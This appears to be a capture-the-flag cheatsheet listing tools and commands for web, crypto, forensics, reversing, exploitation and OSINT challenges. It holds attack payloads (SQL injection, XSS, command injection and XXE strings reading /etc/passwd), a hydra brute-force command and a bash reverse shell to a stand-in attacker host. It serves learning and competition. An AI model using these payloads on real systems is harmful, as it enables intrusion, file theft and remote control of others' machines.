# Jeopardy-Style CTF Cheatsheet

## Web Application Security

| Challenge Type | Tools | Commands/Techniques | Common Approaches |
|----------------|-------|---------------------|-------------------|
| **Hidden Content** | Browser Dev Tools, Burp Suite | `CTRL+SHIFT+I` (Browser), `Ctrl+U` (View Source) | Check HTML comments, JavaScript files, robots.txt, .git folders |
| **Cookie Manipulation** | Cookie Editor extension, Burp | Edit cookies directly in browser | Modify, decode (base64), check JWT tokens (jwt.io) |
| **SQL Injection** | sqlmap, Burp Suite | `sqlmap -u "http://target.com/page?id=1" --dbs` | Try `' OR 1=1--`, `' UNION SELECT 1,2,3--` |
| **XSS** | Browser, custom scripts | `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>` | Test input fields, URL parameters, try bypass filters |
| **CSRF** | Burp Suite, custom HTML | Create forms that auto-submit | Check missing CSRF tokens, test with custom forms |
| **File Upload** | BurpSuite, custom files | Prepare malicious files, manipulate Content-Type | Try alternate extensions (.php.jpg), bypass client-side validation |
| **Directory Traversal** | Browser, curl | `../../../etc/passwd`, `..%2f..%2f..%2fetc%2fpasswd` | Try to access files outside web root |
| **Command Injection** | Browser, curl | `; ls`, `\| cat /etc/passwd`, `$(cat /flag.txt)` | Test input fields that might execute commands |
| **Server-Side Template Injection** | Custom payloads | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | Test different template engine syntaxes |
| **Local File Inclusion** | Browser, curl | `?page=../../../etc/passwd` | Try path traversal to access local files |
| **XML External Entity (XXE)** | Custom XML payloads | `<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | Test XML inputs for entity processing |

## Cryptography Challenges

| Challenge Type | Tools | Commands/Techniques | Common Approaches |
|----------------|-------|---------------------|-------------------|
| **Caesar Cipher** | CyberChef, dcode.fr, Python | `for i in range(26): print(shift(ciphertext, i))` | Try all 26 shifts (brute force) |
| **Substitution Cipher** | quipqiup.com, dcode.fr | Frequency analysis | Look for common patterns (THE, AND) |
| **Vigenère Cipher** | CyberChef, dcode.fr | Determine key length, then solve | Find repeating patterns, use kasiski examination |
| **XOR Encryption** | CyberChef, Python | `bytes_a ^ bytes_b` (Python) | Try single-byte XOR, try known plaintext |
| **Base64** | CyberChef, terminal | `base64 -d file.txt` | Recognize by = padding at end, A-Za-z0-9+/ charset |
| **Hex Encoding** | CyberChef, Python, xxd | `xxd -r -p hex.txt` | Look for 0-9, a-f characters |
| **RSA** | RsaCtfTool, Python | `python RsaCtfTool.py --publickey key.pub --private` | Check small primes, common modulus, Fermat factorization |
| **Hash Cracking** | Hashcat, john, CrackStation | `hashcat -m 0 hash.txt wordlist.txt` | Identify hash type, use rainbow tables or brute force |
| **OpenSSL** | OpenSSL | `openssl enc -d -aes-256-cbc -in file.enc -out file.dec` | Try common passwords, check challenge hints |
| **Steganography in Ciphertext** | Visual inspection | Search for patterns, analyze character distribution | Check for hidden messages in structure of ciphertext |
| **Multi-layered Encoding** | CyberChef, custom scripts | Chain decoding operations | Work backwards, identify each layer |

## Forensics

| Challenge Type | Tools | Commands/Techniques | Common Approaches |
|----------------|-------|---------------------|-------------------|
| **File Analysis** | file, strings, xxd | `file unknown`, `strings -n 8 file`, `xxd file` | Check file type, extract readable strings |
| **Image Forensics** | exiftool, binwalk, steghide | `exiftool image.jpg`, `binwalk -e image.jpg` | Check metadata, extract hidden files |
| **LSB Steganography** | zsteg, stegsolve, OpenStego | `zsteg image.png`, `stegsolve` (GUI tool) | Check least significant bits, try different bit planes |
| **Audio Steganography** | Audacity, Sonic Visualizer | Open file, view spectogram (CTRL+3 in Audacity) | Look for patterns in spectogram, Morse code |
| **Memory Dumps** | Volatility | `vol.py -f memory.dump imageinfo`, `vol.py -f memory.dump --profile=Win7SP1x64 pslist` | Identify processes, network connections, retrieve files |
| **Disk Images** | Autopsy, FTK Imager, TestDisk | Mount image, browse filesystem | Recover deleted files, examine file system artifacts |
| **Network Captures** | Wireshark, tcpdump, NetworkMiner | `wireshark capture.pcap`, `tcpdump -r capture.pcap` | Follow TCP streams, extract files, analyze HTTP traffic |
| **PDF Analysis** | pdfid, pdf-parser, peepdf | `pdfid suspicious.pdf`, `pdf-parser -s JavaScript suspicious.pdf` | Check for hidden objects, JavaScript, embedded files |
| **USB Artifacts** | RegRipper, Autopsy | Examine Windows registry | Check setupapi logs, USB device history |
| **ZIP/Archive Analysis** | zipdetails, file-roller, foremost | `zipdetails archive.zip` | Check for hidden files, broken archives |
| **Corrupted Files** | hexedit, bless | Manual hex editing | Fix file headers, repair broken structures |

## Reverse Engineering

| Challenge Type | Tools | Commands/Techniques | Common Approaches |
|----------------|-------|---------------------|-------------------|
| **Binary Analysis** | Ghidra, IDA Pro, radare2 | `r2 -A binary`, `ghidra` (GUI) | Disassemble, look for interesting functions |
| **Static Analysis** | objdump, nm, strings | `objdump -d binary`, `nm binary`, `strings binary` | Check for function names, strings, disassembly |
| **Dynamic Analysis** | GDB, PEDA, strace, ltrace | `gdb ./binary`, `strace ./binary`, `ltrace ./binary` | Set breakpoints, analyze memory, trace calls |
| **Patching Binaries** | hexedit, Ghidra, radare2 | `r2 -w binary`, patch with hex editor | Modify conditions, bypass checks |
| **Anti-debugging** | GDB scripts, strace | Set hardware breakpoints, analyze pattern | Look for time checks, debugger detection |
| **Obfuscated Code** | De-obfuscation tools, manual analysis | Rename variables, reformat code | Look for patterns, decode strings |
| **Android APK** | jadx, apktool, dex2jar | `apktool d app.apk`, `jadx-gui app.apk` | Decompile to Java, check AndroidManifest.xml |
| **Java/JAR** | JD-GUI, CFR decompiler | `java -jar cfr.jar target.jar --outputdir output` | Decompile to source, check resources |
| **Python** | uncompyle6, pyinstxtractor | `uncompyle6 script.pyc` | Decompile to source |
| **.NET/C#** | dnSpy, ILSpy | Open with dnSpy (GUI) | Decompile to source, modify and recompile |
| **Go Binaries** | Ghidra with Go plugin | Look for Go signatures | Identify main.main, recover structures |

## Binary Exploitation

| Challenge Type | Tools | Commands/Techniques | Common Approaches |
|----------------|-------|---------------------|-------------------|
| **Buffer Overflow** | GDB, PEDA, pwntools | `pattern create 100`, check EIP/RIP overwrite | Find offset, control EIP, locate/create shellcode |
| **Format String** | GDB, pwntools | `%x %x %x` to leak stack, `%n` to write | Leak addresses, overwrite GOT/return addresses |
| **Return-to-Libc** | GDB, ROPgadget, pwntools | `ROPgadget --binary ./target` | Find gadgets, build ROP chain |
| **Heap Exploitation** | GDB, heapinfo, pwntools | Analyze heap structures | Understand allocator, exploit use-after-free/double-free |
| **ROP (Return Oriented Programming)** | ROPgadget, ropper | `ROPgadget --binary ./target --ropchain` | Build chain of gadgets to execute arbitrary code |
| **Integer Overflow** | GDB, code review | Find vulnerable math operations | Identify wrap-around conditions |
| **Race Conditions** | strace, custom scripts | Identify time-of-check/time-of-use issues | Create script to exploit timing windows |
| **PIE/ASLR Bypass** | GDB, info proc mappings | Leak addresses, partial overwrite | Find information leaks to determine addresses |
| **Shellcoding** | pwntools, shellcraft | `shellcraft.sh()` or custom shellcode | Create or adapt shellcode for specific scenarios |
| **Kernel Exploitation** | Specialized tools, GDB | Varies based on challenge | Understand kernel structures, find vulnerabilities |
| **SROP (Sigreturn Oriented Programming)** | pwntools | Use SigreturnFrame in pwntools | Craft fake signal frames to control registers |

## OSINT (Open Source Intelligence)

| Challenge Type | Tools | Commands/Techniques | Common Approaches |
|----------------|-------|---------------------|-------------------|
| **Social Media Research** | Sherlock, Social Mapper | `sherlock username` | Search for usernames across platforms |
| **Email Investigation** | theHarvester, Hunter.io | `theHarvester -d company.com -b all` | Gather email formats, verify addresses |
| **Domain Intelligence** | Whois, nslookup, dnsrecon | `whois domain.com`, `dnsrecon -d domain.com` | Check registration, subdomains, DNS records |
| **Image Analysis** | Google Images, Yandex, TinEye | Reverse image search | Find original source, hidden locations/data |
| **Geolocation** | GeoGuessr techniques, Google Maps | Look for landmarks, signs, architecture | Identify location from visual clues |
| **Public Records** | Public databases, search engines | Advanced Google dorks | Find specific document types, information |
| **Person Research** | People search engines, public records | Search by name, location, associations | Build connections between entities |
| **Phone Numbers** | PhoneInfoga, truecaller | `phoneinfoga scan -n +1234567890` | Identify carrier, location, owner |
| **Metadata Analysis** | exiftool, metagoofil | `exiftool document.pdf` | Extract device info, location, author |
| **Wireless Networks** | Wigle.net | Search by BSSID/SSID | Find physical locations of wireless access points |
| **Website Archives** | Wayback Machine, archive.today | Check historical versions | Find deleted content, changes over time |

## Programming Challenges

| Challenge Type | Tools | Commands/Techniques | Common Approaches |
|----------------|-------|---------------------|-------------------|
| **Python Scripting** | Python, pwntools | `from pwn import *` for CTF scripts | Automate repetitive tasks, solve mathematical problems |
| **Socket Programming** | Python, netcat, pwntools | `r = remote('host', port)` | Create client to interact with remote service |
| **Parsing & Data Extraction** | Python (re, beautifulsoup4) | `import re`, `from bs4 import BeautifulSoup` | Extract patterns from text/HTML, parse structured data |
| **Algorithm Implementation** | Python, C/C++ | Implement common algorithms | Understand problem, code efficient solution |
| **Esoteric Languages** | Specialized interpreters | Research language specifications | Identify language (brainfuck, ook, etc), use interpreter |
| **Automation** | Python, Bash scripting | Create script to solve repetitive challenges | Automate multiple requests, parse responses |
| **API Interaction** | Python (requests), Postman | `import requests` | Understand API endpoints, craft proper requests |
| **SQL Challenges** | MySQL, SQLite, Python | `import sqlite3` | Create queries to extract specific data |
| **Regular Expressions** | regex101.com, Python re | `re.findall(pattern, text)` | Create patterns to match/extract specific text |
| **Cryptography Implementation** | Python (pycrypto, cryptography) | `from Crypto.Cipher import AES` | Implement encryption/decryption algorithms |
| **Computational Challenges** | Python, SageMath | Mathematical libraries | Solve number theory, optimization problems |

## Miscellaneous Techniques

| Challenge Type | Tools | Commands/Techniques | Common Approaches |
|----------------|-------|---------------------|-------------------|
| **QR Codes** | ZBar, mobile phone | `zbarimg qrcode.png` | Scan code, check for errors/modifications |
| **Morse Code** | Audio tools, online converters | Listen or visualize, convert to text | Transcribe dots/dashes, convert to ASCII |
| **Barcode** | ZBar, barcode scanners | `zbarimg barcode.png` | Identify barcode type, scan |
| **Whitespace/Nonprintable** | hexdump, xxd, specialized tools | `xxd file \| grep -v "0000"` | Look for tab/space patterns, invisible characters |
| **Brainfuck/Esoteric Languages** | Online interpreters | Identify syntax, use appropriate interpreter | Recognize patterns, find corresponding interpreter |
| **Parity Bits** | Custom scripts | Check bit patterns | Identify odd/even parity schemes |
| **Magic Numbers/File Headers** | hexedit, xxd | `xxd file \| head` | Fix incorrect file headers, identify true file type |
| **Location-based Challenges** | Google Maps, OSINT techniques | Research geographic elements | Look for coordinates, landmarks, geotags |
| **Subway/Train Maps** | Official transit maps | Research transit systems | Decode station sequences, find connections |
| **Book Ciphers** | Online databases, physical books | Identify book, apply cipher method | Look for page/line/word references |
| **3D Files/Printing** | Blender, MeshLab | Open and inspect 3D models | Look inside 3D models, check for hidden text |
| **Historic/Classical Ciphers** | dcode.fr, specialized tools | Research cipher methods | Identify cipher from clues, apply appropriate technique |

## Useful Command-Line One-Liners

| Purpose | Command | Notes |
|---------|---------|-------|
| **Extract strings from binary** | `strings -n 8 binary \| grep -i flag` | Find strings containing "flag" |
| **Find hidden text in image** | `steghide extract -sf image.jpg` | Attempts to extract without password |
| **Extract embedded files** | `binwalk -e suspicious_file` | Extracts detected files |
| **Follow TCP stream in PCAP** | `tshark -r capture.pcap -Y "tcp.stream eq 1" -T fields -e data` | Extract specific TCP stream |
| **Convert hex to ASCII** | `echo "48656c6c6f" \| xxd -r -p` | Hex to text conversion |
| **Analyze image metadata** | `exiftool -a -u image.jpg` | Shows all metadata including unknown tags |
| **Fix file signature/magic bytes** | `printf '\x89\x50\x4e\x47' \| dd of=file.png bs=1 count=4 conv=notrunc` | Fix corrupted PNG header |
| **Extract ZIP comment** | `unzip -z file.zip` | Get hidden info in ZIP comment field |
| **Get HTTP headers** | `curl -I https://example.com` | Check server headers for info |
| **Extract EXIF GPS data** | `exiftool -n -p '$GPSLatitude, $GPSLongitude' image.jpg` | Extract coordinates from image |
| **Find files modified in last 24h** | `find / -type f -mtime -1` | Recent file changes |
| **Dump HTTP response with SSL info** | `openssl s_client -connect example.com:443` | SSL certificate analysis |
| **Get favicon hash for shodan** | `curl https://example.com/favicon.ico \| openssl dgst -md5` | Favicon fingerprinting |
| **Brute force basic auth** | `hydra -l admin -P wordlist.txt example.com http-get /admin/` | Password attacks |
| **Extract SSL certificate details** | `echo \| openssl s_client -connect example.com:443 -showcerts` | Certificate analysis |
| **Check for SQL injection** | `sqlmap -u "https://example.com/page.php?id=1" --dbs` | Quick SQLi test |
| **Find writable web directories** | `find /var/www/ -type d -writable` | Identify upload targets |
| **List all open ports** | `netstat -tulpn` | Check listening services |
| **Verify file hash** | `sha256sum file.bin` | Confirm file integrity |
| **One-liner reverse shell** | `bash -i >& /dev/tcp/attacker-ip/4444 0>&1` | Basic reverse shell |
| **Convert epoch time** | `date -d @1609459200` | Translate timestamps |
